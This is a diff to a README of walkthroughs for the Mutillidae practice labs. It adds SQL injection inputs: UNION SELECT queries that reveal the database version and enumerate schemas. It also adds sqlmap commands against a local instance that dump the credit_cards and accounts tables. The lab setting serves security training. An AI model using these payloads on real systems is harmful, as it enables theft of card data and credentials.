@@ -69,6 +69,10 @@ This labs are documented in many yt videos and now here. I try to solve the labs
    [] The $ is located where the injection is to put in (' ORDER BY 7 #) end with a hashtag for comment the *and password* . 
    [] ![obtenerColumnas](https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%209%20Walkthrough/numero%20de%20columnas.png)
    </p>
+   [] Username: ' UNION SELECT 1,@@VERSION,3,4,5,6,7 -- - 
+   This show the version of this database
+   [] Username: ' UNION SELECT 1,SCHEMA_NAME,3,4,5,6,7 FROM information_schema.schemata  -- -
+   Show the tables in database
   
   - __Lab 10 : SQL Injection - Pivoting with SQL iNjection__ 
 Hint : It is possible to use SQL injection on the User Info page to access other database tables besides the user database table
@@ -76,13 +80,21 @@ Hint : It is possible to use SQL injection on the User Info page to access other
 Start: /user-info.php 
 
   - __Lab 11 SQLMap__ 
+![sqlmap](https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%2011/--tables-D--dbs.png)
+
+Commands Used in this lab: 
+CC data --> $sqlmap -u 127.0.0.1/index.php?page=user-info.php&username=1" --dump -D dumpfile -T credit_cards
+
+Password data --> $sqlmap -u 127.0.0.1/index.php?page=user-info.php&username=1" --dump -D dumpfile -T accounts
+
+extra args: --level=2 / --risk=1
+
 
 <details>
 <summary>Details</summary>
 <br />
+Coding...
 
-asdasd
-adfsd
 </details>
 
 
